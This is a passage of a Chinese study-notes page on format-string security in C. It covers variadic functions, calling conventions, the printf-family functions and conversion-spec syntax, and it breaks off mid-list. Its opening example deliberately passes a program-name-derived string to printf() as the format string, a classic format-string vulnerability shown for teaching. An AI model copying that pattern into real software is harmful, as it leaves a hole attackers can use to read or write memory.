
<!DOCTYPE html>

<html class="no-js" lang="zh">
<head>
<meta charset="utf-8"/>
<meta content="width=device-width,initial-scale=1" name="viewport"/>
<meta content="信息安全、前端相关" name="description"/>
<meta content="Jason" name="author"/>
<link href="../assets/images/favicon.png" rel="icon"/>
<meta content="mkdocs-1.2.2, mkdocs-material-7.3.3" name="generator"/>
<title>格式化输出 - Jason的笔记小屋</title>
<link href="../assets/stylesheets/main.5143246d.min.css" rel="stylesheet"/>
<link href="../assets/stylesheets/palette.3f5d1f46.min.css" rel="stylesheet"/>
<link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
<link href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&amp;display=fallback" rel="stylesheet"/>
<style>:root{--md-text-font-family:"Roboto";--md-code-font-family:"Roboto Mono"}</style>
<link href="../assets/stylesheets/ex.css" rel="stylesheet"/>
<script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-Q0FWVZ6L5Y"),document.addEventListener("DOMContentLoaded",function(){"undefined"!=typeof location$&&location$.subscribe(function(t){gtag("config","G-Q0FWVZ6L5Y",{page_path:t.pathname})})})</script>
<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-Q0FWVZ6L5Y"></script>
</head>
<body data-md-color-accent="" data-md-color-primary="" data-md-color-scheme="default" dir="ltr">
<script>function __prefix(e){return new URL("..",location).pathname+"."+e}function __get(e,t=localStorage){return JSON.parse(t.getItem(__prefix(e)))}</script>
<script>var palette=__get("__palette");if(null!==palette&&"object"==typeof palette.color)for(var key in palette.color)document.body.setAttribute("data-md-color-"+key,palette.color[key])</script>
<input autocomplete="off" class="md-toggle" data-md-toggle="drawer" id="__drawer" type="checkbox"/>
<input autocomplete="off" class="md-toggle" data-md-toggle="search" id="__search" type="checkbox"/>
<label class="md-overlay" for="__drawer"></label>
<div data-md-component="skip">
<a class="md-skip" href="#_1">
          跳转至
        </a>
</div>
<div data-md-component="announce">
</div>
<header class="md-header md-header--lifted" data-md-component="header">
<nav aria-label="Header" class="md-header__inner md-grid">
<a aria-label="Jason的笔记小屋" class="md-header__button md-logo" data-md-component="logo" href="../index.html" title="Jason的笔记小屋">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M19.35 10.03A7.49 7.49 0 0 0 12 4C9.11 4 6.6 5.64 5.35 8.03A6.004 6.004 0 0 0 0 14a6 6 0 0 0 6 6h13a5 5 0 0 0 5-5c0-2.64-2.05-4.78-4.65-4.97z"></path></svg>
</a>
<label class="md-header__button md-icon" for="__drawer">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"></path></svg>
</label>
<div class="md-header__title" data-md-component="header-title">
<div class="md-header__ellipsis">
<div class="md-header__topic">
<span class="md-ellipsis">
            Jason的笔记小屋
          </span>
</div>
<div class="md-header__topic" data-md-component="header-topic">
<span class="md-ellipsis">
            
              格式化输出
            
          </span>
</div>
</div>
</div>
<form class="md-header__option" data-md-component="palette">
<input aria-label="切换至夜间模式" class="md-option" data-md-color-accent="" data-md-color-media="(prefers-color-scheme: light)" data-md-color-primary="" data-md-color-scheme="default" id="__palette_1" name="__palette" type="radio"/>
<label class="md-header__button md-icon" for="__palette_2" hidden="" title="切换至夜间模式">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6zm0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4zM7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"></path></svg>
</label>
<input aria-label="切换至白天模式" class="md-option" data-md-color-accent="" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-primary="" data-md-color-scheme="slate" id="__palette_2" name="__palette" type="radio"/>
<label class="md-header__button md-icon" for="__palette_1" hidden="" title="切换至白天模式">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3z"></path></svg>
</label>
</form>
<label class="md-header__button md-icon" for="__search">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"></path></svg>
</label>
<div class="md-search" data-md-component="search" role="dialog">
<label class="md-search__overlay" for="__search"></label>
<div class="md-search__inner" role="search">
<form class="md-search__form" name="search">
<input aria-label="搜索" autocapitalize="off" autocomplete="off" autocorrect="off" class="md-search__input" data-md-component="search-query" name="query" placeholder="搜索" required="" spellcheck="false" type="text"/>
<label class="md-search__icon md-icon" for="__search">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"></path></svg>
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"></path></svg>
</label>
<nav aria-label="Search" class="md-search__options">
<a aria-label="Share" class="md-search__icon md-icon" data-clipboard="" data-clipboard-text="" data-md-component="search-share" href="javascript:void(0)" tabindex="-1">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7 0-.24-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91 1.61 0 2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08z"></path></svg>
</a>
<button aria-label="Clear" class="md-search__icon md-icon" tabindex="-1" type="reset">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"></path></svg>
</button>
</nav>
<div class="md-search__suggest" data-md-component="search-suggest"></div>
</form>
<div class="md-search__output">
<div class="md-search__scrollwrap" data-md-scrollfix="">
<div class="md-search-result" data-md-component="search-result">
<div class="md-search-result__meta">
            正在初始化搜索引擎
          </div>
<ol class="md-search-result__list"></ol>
</div>
</div>
</div>
</div>
</div>
</nav>
<nav aria-label="Tabs" class="md-tabs" data-md-component="tabs">
<div class="md-tabs__inner md-grid">
<ul class="md-tabs__list">
<li class="md-tabs__item">
<a class="md-tabs__link" href="../index.html">
      主页
    </a>
</li>
<li class="md-tabs__item">
<a class="md-tabs__link" href="../web_basic/index.html">
        web开发技术基础
      </a>
</li>
<li class="md-tabs__item">
<a class="md-tabs__link md-tabs__link--active" href="index.html">
        软件安全
      </a>
</li>
<li class="md-tabs__item">
<a class="md-tabs__link" href="../net_security/index.html">
        网络安全
      </a>
</li>
<li class="md-tabs__item">
<a class="md-tabs__link" href="../408-helper/index.html">
        408助手
      </a>
</li>
</ul>
</div>
</nav>
</header>
<div class="md-container" data-md-component="container">
<main class="md-main" data-md-component="main">
<div class="md-main__inner md-grid">
<div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation">
<div class="md-sidebar__scrollwrap">
<div class="md-sidebar__inner">
<nav aria-label="Navigation" class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" data-md-level="0">
<label class="md-nav__title" for="__drawer">
<a aria-label="Jason的笔记小屋" class="md-nav__button md-logo" data-md-component="logo" href="../index.html" title="Jason的笔记小屋">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M19.35 10.03A7.49 7.49 0 0 0 12 4C9.11 4 6.6 5.64 5.35 8.03A6.004 6.004 0 0 0 0 14a6 6 0 0 0 6 6h13a5 5 0 0 0 5-5c0-2.64-2.05-4.78-4.65-4.97z"></path></svg>
</a>
    Jason的笔记小屋
  </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../index.html">
        主页
      </a>
</li>
<li class="md-nav__item md-nav__item--nested">
<input checked="" class="md-nav__toggle md-toggle" data-md-state="indeterminate" data-md-toggle="__nav_2" id="__nav_2" type="checkbox"/>
<div class="md-nav__link md-nav__link--index">
<a href="../web_basic/index.html">web开发技术基础</a>
<label for="__nav_2">
<span class="md-nav__icon md-icon"></span>
</label>
</div>
<nav aria-label="web开发技术基础" class="md-nav" data-md-level="1">
<label class="md-nav__title" for="__nav_2">
<span class="md-nav__icon md-icon"></span>
          web开发技术基础
        </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../web_basic/basic-structure.html">
        Web的基本架构
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../web_basic/html.html">
        HTML
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../web_basic/css.html">
        CSS
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../web_basic/javascript.html">
        JavaScript
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../web_basic/dom.html">
        DOM
      </a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--active md-nav__item--nested">
<input checked="" class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" id="__nav_3" type="checkbox"/>
<div class="md-nav__link md-nav__link--index">
<a href="index.html">软件安全</a>
<label for="__nav_3">
<span class="md-nav__icon md-icon"></span>
</label>
</div>
<nav aria-label="软件安全" class="md-nav" data-md-level="1">
<label class="md-nav__title" for="__nav_3">
<span class="md-nav__icon md-icon"></span>
          软件安全
        </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="basic.html">
        软件基础
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="string.html">
        字符串安全
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="pointer.html">
        指针安全
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="memory-management.html">
        动态内存管理
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="integer-security.html">
        整数安全
      </a>
</li>
<li class="md-nav__item md-nav__item--active">
<input class="md-nav__toggle md-toggle" data-md-toggle="toc" id="__toc" type="checkbox"/>
<label class="md-nav__link md-nav__link--active" for="__toc">
          格式化输出
          <span class="md-nav__icon md-icon"></span>
</label>
<a class="md-nav__link md-nav__link--active" href="string-format.html">
        格式化输出
      </a>
<nav aria-label="目录" class="md-nav md-nav--secondary">
<label class="md-nav__title" for="__toc">
<span class="md-nav__icon md-icon"></span>
      目录
    </label>
<ul class="md-nav__list" data-md-component="toc" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="#_2">
    格式化输出函数
  </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#1">
    格式化字符串1
  </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#_3">
    漏洞利用
  </a>
<nav aria-label="漏洞利用" class="md-nav">
<ul class="md-nav__list">
<li class="md-nav__item">
<a class="md-nav__link" href="#_4">
    缓冲区溢出
  </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#_5">
    可伸展的缓冲区
  </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#printf">
    输出流（printf()）
  </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#_6">
    国际化
  </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#_7">
    栈随机化
  </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#_8">
    直接存取参数
  </a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#_9">
    缓解策略
  </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#_10">
    漏洞实例
  </a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="concurrency.html">
        并发
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="io.html">
        文件输入输出
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="practice.html">
        软件安全实践
      </a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--nested">
<input checked="" class="md-nav__toggle md-toggle" data-md-state="indeterminate" data-md-toggle="__nav_4" id="__nav_4" type="checkbox"/>
<div class="md-nav__link md-nav__link--index">
<a href="../net_security/index.html">网络安全</a>
<label for="__nav_4">
<span class="md-nav__icon md-icon"></span>
</label>
</div>
<nav aria-label="网络安全" class="md-nav" data-md-level="1">
<label class="md-nav__title" for="__nav_4">
<span class="md-nav__icon md-icon"></span>
          网络安全
        </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../net_security/assets.html">
        网络安全概述
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../net_security/networkattack.html">
        网络攻击
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../net_security/firewall.html">
        防火墙
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../net_security/ids.html">
        入侵检测
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../net_security/vpn.html">
        虚拟专用网
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../net_security/application.html">
        应用安全——PGP为例
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../net_security/socialengineering.html">
        社会工程学
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../net_security/hook.html">
        HOOK
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../net_security/side-channel.html">
        侧信道攻击
      </a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--nested">
<input checked="" class="md-nav__toggle md-toggle" data-md-state="indeterminate" data-md-toggle="__nav_5" id="__nav_5" type="checkbox"/>
<div class="md-nav__link md-nav__link--index">
<a href="../408-helper/index.html">408助手</a>
<label for="__nav_5">
<span class="md-nav__icon md-icon"></span>
</label>
</div>
<nav aria-label="408助手" class="md-nav" data-md-level="1">
<label class="md-nav__title" for="__nav_5">
<span class="md-nav__icon md-icon"></span>
          408助手
        </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../408-helper/what-does-408-test.html">
        408考试大纲（2020版）
      </a>
</li>
<li class="md-nav__item md-nav__item--section md-nav__item--nested">
<input checked="" class="md-nav__toggle md-toggle" data-md-state="indeterminate" data-md-toggle="__nav_5_3" id="__nav_5_3" type="checkbox"/>
<div class="md-nav__link md-nav__link--index">
<a href="../408-helper/computer-structure/index.html">计算机组成原理</a>
<label for="__nav_5_3">
<span class="md-nav__icon md-icon"></span>
</label>
</div>
<nav aria-label="计算机组成原理" class="md-nav" data-md-level="2">
<label class="md-nav__title" for="__nav_5_3">
<span class="md-nav__icon md-icon"></span>
          计算机组成原理
        </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../408-helper/computer-structure/operating.html">
        运算器
      </a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--section md-nav__item--nested">
<input checked="" class="md-nav__toggle md-toggle" data-md-state="indeterminate" data-md-toggle="__nav_5_4" id="__nav_5_4" type="checkbox"/>
<div class="md-nav__link md-nav__link--index">
<a href="../408-helper/data-structure/index.html">数据结构</a>
<label for="__nav_5_4">
<span class="md-nav__icon md-icon"></span>
</label>
</div>
<nav aria-label="数据结构" class="md-nav" data-md-level="2">
<label class="md-nav__title" for="__nav_5_4">
<span class="md-nav__icon md-icon"></span>
          数据结构
        </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../408-helper/data-structure/linear-list.html">
        线性表
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../408-helper/data-structure/stack.html">
        栈
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../408-helper/data-structure/queue.html">
        队列
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../408-helper/data-structure/array.html">
        数组
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../408-helper/data-structure/string.html">
        字符串
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../408-helper/data-structure/tree.html">
        树
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../408-helper/data-structure/graph.html">
        图
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../408-helper/data-structure/searching.html">
        查找
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../408-helper/data-structure/sorting.html">
        排序
      </a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--section md-nav__item--nested">
<input checked="" class="md-nav__toggle md-toggle" data-md-state="indeterminate" data-md-toggle="__nav_5_5" id="__nav_5_5" type="checkbox"/>
<div class="md-nav__link md-nav__link--index">
<a href="../408-helper/computer-network/index.html">计算机网络</a>
<label for="__nav_5_5">
<span class="md-nav__icon md-icon"></span>
</label>
</div>
<nav aria-label="计算机网络" class="md-nav" data-md-level="2">
<label class="md-nav__title" for="__nav_5_5">
<span class="md-nav__icon md-icon"></span>
          计算机网络
        </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../408-helper/computer-network/network-layer.html">
        网络层
      </a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--section md-nav__item--nested">
<input checked="" class="md-nav__toggle md-toggle" data-md-state="indeterminate" data-md-toggle="__nav_5_6" id="__nav_5_6" type="checkbox"/>
<div class="md-nav__link md-nav__link--index">
<a href="../408-helper/operating-system/index.html">操作系统</a>
<label for="__nav_5_6">
<span class="md-nav__icon md-icon"></span>
</label>
</div>
<nav aria-label="操作系统" class="md-nav" data-md-level="2">
<label class="md-nav__title" for="__nav_5_6">
<span class="md-nav__icon md-icon"></span>
          操作系统
        </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../408-helper/operating-system/process.html">
        进程管理
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../408-helper/operating-system/memory.html">
        内存管理
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../408-helper/operating-system/file.html">
        文件管理
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../408-helper/operating-system/io.html">
        输入输出(I/O)管理
      </a>
</li>
</ul>
</nav>
</li>
</ul>
</nav>
</li>
</ul>
</nav>
</div>
</div>
</div>
<div class="md-content" data-md-component="content">
<article class="md-content__inner md-typeset">
<h1 id="_1">格式化字符串<a class="headerlink" href="#_1" title="Permanent link">¶</a></h1>
<p>格式化输出：参数由一个格式字符串和可变数目的参数构成
从一个例子入手：
<div class="highlight"><pre><span></span><code><span class="linenos" data-linenos=" 1 "></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="linenos" data-linenos=" 2 "></span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
<span class="linenos" data-linenos=" 3 "></span>
<span class="linenos" data-linenos=" 4 "></span><span class="kt">void</span> <span class="nf">usage</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">pname</span><span class="p">)</span> <span class="p">{</span>
<span class="linenos" data-linenos=" 5 "></span>     <span class="kt">char</span> <span class="n">usageStr</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
<span class="linenos" data-linenos=" 6 "></span>     <span class="n">snprintf</span><span class="p">(</span><span class="n">usageStr</span><span class="p">,</span> <span class="mi">1024</span><span class="p">,</span>
<span class="hll"><span class="linenos" data-linenos=" 7 "></span>            <span class="s">"Usage: %s &lt;target&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
</span><span class="linenos" data-linenos=" 8 "></span>            <span class="n">pname</span><span class="p">);</span>
<span class="linenos" data-linenos=" 9 "></span>     <span class="n">printf</span><span class="p">(</span><span class="n">usageStr</span><span class="p">);</span>
<span class="linenos" data-linenos="10 "></span> <span class="p">}</span>
<span class="linenos" data-linenos="11 "></span>
<span class="linenos" data-linenos="12 "></span><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
<span class="linenos" data-linenos="13 "></span>    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
<span class="linenos" data-linenos="14 "></span>        <span class="n">usage</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
<span class="linenos" data-linenos="15 "></span>        <span class="n">exit</span><span class="p">(</span><span class="mi">-1</span><span class="p">);</span>
<span class="linenos" data-linenos="16 "></span>    <span class="p">}</span>
<span class="linenos" data-linenos="17 "></span><span class="p">}</span>
</code></pre></div></p>
<details class="info"><summary>变参函数</summary><p>可变参数函数又称参数个数可变函数(也简称变参函数)，即函数参数数目可变。可以通过ANSI-C &amp; UNIX System V 两种系统实现</p>
<div class="tabbed-set tabbed-alternate" data-tabs="1:2"><input checked="checked" id="__tabbed_1_1" name="__tabbed_1" type="radio"><input id="__tabbed_1_2" name="__tabbed_1" type="radio"><div class="tabbed-labels"><label for="__tabbed_1_1">stdargs</label><label for="__tabbed_1_2">varargs</label></div>
<div class="tabbed-content">
<div class="tabbed-block">
<p>stdargs是ANSI C标准，通过一个部分参数列表跟一个省略号来声明，例如<code>int average(int first, ...)</code>
<div class="highlight"><pre><span></span><code><span class="cm">/* 使用stdargs实现average函数 */</span>
<span class="kt">int</span> <span class="nf">average</span><span class="p">(</span><span class="kt">int</span> <span class="n">first</span><span class="p">,</span> <span class="p">...)</span> <span class="p">{</span>
   <span class="kt">int</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">sum</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">i</span> <span class="o">=</span> <span class="n">first</span><span class="p">;</span>
   <span class="kt">va_list</span> <span class="n">marker</span><span class="p">;</span>
   <span class="n">va_start</span><span class="p">(</span><span class="n">marker</span><span class="p">,</span> <span class="n">first</span><span class="p">);</span>
   <span class="k">while</span> <span class="p">(</span><span class="n">i</span> <span class="o">!=</span> <span class="mi">-1</span><span class="p">)</span> <span class="p">{</span>
     <span class="n">sum</span> <span class="o">+=</span> <span class="n">i</span><span class="p">;</span>
     <span class="n">count</span><span class="o">++</span><span class="p">;</span>
     <span class="n">i</span> <span class="o">=</span> <span class="n">va_arg</span><span class="p">(</span><span class="n">marker</span><span class="p">,</span> <span class="kt">int</span><span class="p">);</span>
   <span class="p">}</span>
   <span class="n">va_end</span><span class="p">(</span><span class="n">marker</span><span class="p">);</span>
   <span class="k">return</span><span class="p">(</span><span class="n">sum</span> <span class="o">?</span> <span class="p">(</span><span class="n">sum</span> <span class="o">/</span> <span class="n">count</span><span class="p">)</span> <span class="o">:</span> <span class="mi">0</span><span class="p">);</span>
 <span class="p">}</span>
</code></pre></div></p>
</div>
<div class="tabbed-block">
<p>varargs运行在Unix System V，使用定义于varargs.h中的宏，例如<code>int average(va_list) va_dcl</code>
<div class="highlight"><pre><span></span><code><span class="cm">/* 使用varargs实现average函数 */</span>
<span class="kt">int</span> <span class="nf">average</span><span class="p">(</span><span class="n">va_alist</span><span class="p">)</span> <span class="n">va_dcl</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">count</span><span class="p">,</span> <span class="n">sum</span><span class="p">;</span>
    <span class="kt">va_list</span> <span class="n">marker</span><span class="p">;</span>
    <span class="n">va_start</span><span class="p">(</span><span class="n">marker</span><span class="p">);</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">sum</span> <span class="o">=</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
       <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="n">va_arg</span><span class="p">(</span><span class="n">marker</span><span class="p">,</span> <span class="kt">int</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">-1</span><span class="p">;</span>
          <span class="n">count</span><span class="o">++</span><span class="p">)</span>
      <span class="n">sum</span> <span class="o">+=</span> <span class="n">i</span><span class="p">;</span>
    <span class="n">va_end</span><span class="p">(</span><span class="n">marker</span><span class="p">);</span>
    <span class="k">return</span><span class="p">(</span><span class="n">sum</span> <span class="o">?</span> <span class="p">(</span><span class="n">sum</span> <span class="o">/</span> <span class="n">count</span><span class="p">)</span> <span class="o">:</span> <span class="mi">0</span><span class="p">);</span>
 <span class="p">}</span>
</code></pre></div></p>
</div>
</div>
</input></input></div>
</details>
<div class="admonition info">
<p class="admonition-title"><code>__stdcall</code>、<code>__cdecl</code>和<code>__fastcall</code></p>
<table>
<thead>
<tr>
<th align="left"></th>
<th align="center"><code>__stdcall</code></th>
<th align="center"><code>__cdecl</code></th>
<th align="center"><code>__fastcall</code></th>
</tr>
</thead>
<tbody>
<tr>
<td align="left">参数传递方式</td>
<td align="center">从右向左压栈</td>
<td align="center">从右向左压栈</td>
<td align="center">左边开始的两个不大于4字节的参数分别放在ECX和EDX寄存器，其余的参数仍然从右向左压栈传递</td>
</tr>
<tr>
<td align="left">清理栈方</td>
<td align="center">被调用函数清理</td>
<td align="center">调用者清理</td>
<td align="center">被调用者清理</td>
</tr>
<tr>
<td align="left">适用场合</td>
<td align="center">Win API</td>
<td align="center">c/c++ MFC默认方式，可变参数的时候使用</td>
<td align="center">速度快</td>
</tr>
<tr>
<td align="left">C编译修饰约定</td>
<td align="center">_functionname@number</td>
<td align="center">_functionname</td>
<td align="center">@functionname@number</td>
</tr>
</tbody>
</table>
<p>注：functionname代表输出函数名，number代表其参数的字节数</p>
</div>
<h2 id="_2">格式化输出函数<a class="headerlink" href="#_2" title="Permanent link">¶</a></h2>
<div class="admonition info">
<p>前四个函数还有带"v"（如<code>vprintf()</code>）的版本，它们的功能完全相同，参数区别仅仅在于带了一个<code>va_list</code>类型的参数</p>
</div>
<div class="tabbed-set tabbed-alternate" data-tabs="2:3"><input checked="checked" id="__tabbed_2_1" name="__tabbed_2" type="radio"><input id="__tabbed_2_2" name="__tabbed_2" type="radio"><input id="__tabbed_2_3" name="__tabbed_2" type="radio"><div class="tabbed-labels"><label for="__tabbed_2_1"><code>fprintf()</code>和<code>printf()</code></label><label for="__tabbed_2_2"><code>sprintf()</code>和<code>snprintf()</code></label><label for="__tabbed_2_3">syslog()</label></div>
<div class="tabbed-content">
<div class="tabbed-block">
<ul>
<li>原型：<code>int fprintf(FILE *stream, const char *format [,argument]...)</code></li>
<li>按照格式字符串的内容将输出写入流(<code>stream</code>)中</li>
<li><code>printf()</code>将写入<code>stdout</code>中</li>
</ul>
</div>
<div class="tabbed-block">
<ul>
<li>原型：<code>int sprintf(char *string, char *format [,argument,...])</code>，<code>snprintf()</code>多一个参数size，指定可写入字符的最大值n</li>
<li>当n非零时，输出的字符超过“n-1”的部分会被舍弃而不会写入数组中。并且，在写入数组的字符末尾会添加一个空字符。</li>
</ul>
</div>
<div class="tabbed-block">
<ul>
<li>原型：<code>int syslog(int priority, char *format, ...)</code></li>
<li>并没有定义在C99规范中，但是包含在SUSv2中</li>
<li>Windows不支持</li>
<li>接受一个优先级参数、一个格式规范以及该格式所需的任意参数，并且在系统的日志记录（syslogd）中生成一条日志消息</li>
</ul>
</div>
</div>
</input></input></input></div>
<h2 id="1">格式化字符串<sup id="fnref:1"><a class="footnote-ref" href="#fn:1">1</a></sup><a class="headerlink" href="#1" title="Permanent link">¶</a></h2>
<ul>
<li>
<p>由普通字符和转换规范构成的序列</p>
<ul>
<li>普通字符被原封不动地复制到输出流中</li>
<li>转换规范根据与实参对应的转换指示符对其进行转换，然后将结果写入输出流中。解析的顺序是从左向右</li>
</ul>
<div class="admonition tip">
<p class="admonition-title">转换规范构成</p>
<p>一个格式化字符串转换规范符合这个式子：<code>%[flags] [width] [.precision] [{length-modifier}] conversion-specifier.</code>
例如<code>%-10.8ld</code>：将一个long int型的参数按照十进制格式打印，在一个最小宽度为10个字符的域中保持最少8位左对齐
<div class="highlight"><pre><span></span><code>% -     10     .8         l                d
  ↓     ↓       ↓         ↓                ↓
flags  width precision length-modifier conversion-specifier
</code></pre></div></p>
</div>
</li>
<li>
